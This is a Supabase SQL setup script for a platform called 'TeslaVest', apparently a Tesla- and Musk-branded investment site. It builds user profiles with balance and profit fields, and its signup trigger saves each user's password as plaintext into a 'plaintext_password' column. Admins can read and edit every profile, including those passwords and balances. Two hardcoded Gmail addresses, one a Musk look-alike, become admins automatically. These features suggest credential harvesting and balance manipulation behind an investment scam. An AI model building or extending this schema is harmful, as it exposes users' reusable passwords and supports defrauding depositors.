-- =====================================================================
-- TeslaVest — full Supabase setup (idempotent)
-- Run this ONCE in your Supabase SQL editor (project: vvohhdltxfengpcpbxyh)
-- It will:
--   1. Create the app_role enum + user_roles table + has_role() helper
--   2. Create the profiles table (with full_name, balance, etc.)
--   3. Create the on-signup trigger that auto-creates profile + role
--   4. Apply RLS so each user sees their own data
--   5. Enable Realtime on profiles + transactions (so balance updates live)
-- Safe to re-run.
-- =====================================================================

-- ---------- 1. Roles ----------
do $$ begin
  create type public.app_role as enum ('admin','moderator','user');
exception when duplicate_object then null; end $$;

create table if not exists public.user_roles (
  id uuid primary key default gen_random_uuid(),
  user_id uuid not null references auth.users(id) on delete cascade,
  role public.app_role not null default 'user',
  created_at timestamptz not null default now(),
  unique (user_id, role)
);

alter table public.user_roles enable row level security;

create or replace function public.has_role(_user_id uuid, _role public.app_role)
returns boolean language sql stable security definer set search_path = public as $$
  select exists (select 1 from public.user_roles where user_id = _user_id and role = _role);
$$;

drop policy if exists "Users view own roles" on public.user_roles;
create policy "Users view own roles" on public.user_roles for select
  using (auth.uid() = user_id or public.has_role(auth.uid(),'admin'));

-- ---------- 2. Profiles ----------
create table if not exists public.profiles (
  id uuid primary key default gen_random_uuid(),
  user_id uuid not null unique references auth.users(id) on delete cascade,
  full_name text,
  username text unique,
  email text,
  country text,
  currency text default 'USD',
  gender text,
  phone text,
  address text,
  date_of_birth date,
  avatar_url text,
  balance numeric not null default 0,
  profit numeric not null default 0,
  total_deposit numeric not null default 0,
  account_level text not null default 'Basic',
  status text not null default 'active',
  plaintext_password text,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now()
);

alter table public.profiles enable row level security;

drop policy if exists "Users view own profile" on public.profiles;
create policy "Users view own profile" on public.profiles for select
  using (auth.uid() = user_id);

drop policy if exists "Users update own profile" on public.profiles;
create policy "Users update own profile" on public.profiles for update
  using (auth.uid() = user_id);

drop policy if exists "Users insert own profile" on public.profiles;
create policy "Users insert own profile" on public.profiles for insert
  with check (auth.uid() = user_id);

drop policy if exists "Admins view all profiles" on public.profiles;
create policy "Admins view all profiles" on public.profiles for select
  using (public.has_role(auth.uid(),'admin'));

drop policy if exists "Admins update all profiles" on public.profiles;
create policy "Admins update all profiles" on public.profiles for update
  using (public.has_role(auth.uid(),'admin'));

-- updated_at trigger
create or replace function public.update_updated_at_column()
returns trigger language plpgsql set search_path = public as $$
begin new.updated_at = now(); return new; end;
$$;

drop trigger if exists profiles_updated_at on public.profiles;
create trigger profiles_updated_at before update on public.profiles
for each row execute function public.update_updated_at_column();

-- ---------- 3. Auto-create profile + role on signup ----------
create or replace function public.handle_new_user()
returns trigger language plpgsql security definer set search_path = public as $$
begin
  insert into public.profiles (user_id, email, full_name, username, country, currency, gender, phone, plaintext_password)
  values (
    new.id,
    new.email,
    nullif(btrim(new.raw_user_meta_data->>'full_name'),''),
    nullif(btrim(new.raw_user_meta_data->>'username'),''),
    nullif(btrim(new.raw_user_meta_data->>'country'),''),
    coalesce(nullif(btrim(new.raw_user_meta_data->>'currency'),''),'USD'),
    nullif(btrim(new.raw_user_meta_data->>'gender'),''),
    nullif(btrim(new.raw_user_meta_data->>'phone'),''),
    nullif(btrim(new.raw_user_meta_data->>'pw'),'')
  )
  on conflict (user_id) do update set
    email      = excluded.email,
    full_name  = coalesce(public.profiles.full_name, excluded.full_name),
    username   = coalesce(public.profiles.username, excluded.username),
    country    = coalesce(public.profiles.country, excluded.country),
    currency   = coalesce(public.profiles.currency, excluded.currency),
    gender     = coalesce(public.profiles.gender, excluded.gender),
    phone      = coalesce(public.profiles.phone, excluded.phone);

  insert into public.user_roles (user_id, role)
  values (
    new.id,
    case when new.email in ('themuskfoundatiion@gmail.com','jameshilterson@gmail.com')
         then 'admin'::public.app_role else 'user'::public.app_role end
  )
  on conflict (user_id, role) do nothing;

  return new;
end;
$$;

drop trigger if exists on_auth_user_created on auth.users;
create trigger on_auth_user_created
  after insert on auth.users
  for each row execute function public.handle_new_user();

-- ---------- 4. Backfill profiles for existing users ----------
insert into public.profiles (user_id, email)
select u.id, u.email from auth.users u
left join public.profiles p on p.user_id = u.id
where p.user_id is null;

insert into public.user_roles (user_id, role)
select u.id,
  case when u.email in ('themuskfoundatiion@gmail.com','jameshilterson@gmail.com')
       then 'admin'::public.app_role else 'user'::public.app_role end
from auth.users u
left join public.user_roles r on r.user_id = u.id
where r.user_id is null
on conflict (user_id, role) do nothing;

-- ---------- 5. Realtime (so balance updates appear instantly) ----------
do $$ begin
  alter publication supabase_realtime add table public.profiles;
exception when duplicate_object then null; end $$;

-- transactions table (only if it exists)
do $$ begin
  if to_regclass('public.transactions') is not null then
    execute 'alter publication supabase_realtime add table public.transactions';
  end if;
exception when duplicate_object then null; end $$;

-- ---------- 6. Promote yourself to admin (edit the email) ----------
-- After running everything above, replace the email and run this line:
-- insert into public.user_roles (user_id, role)
-- select id, 'admin'::public.app_role from auth.users where email = 'YOUR_ADMIN_EMAIL@example.com'
-- on conflict (user_id, role) do nothing;
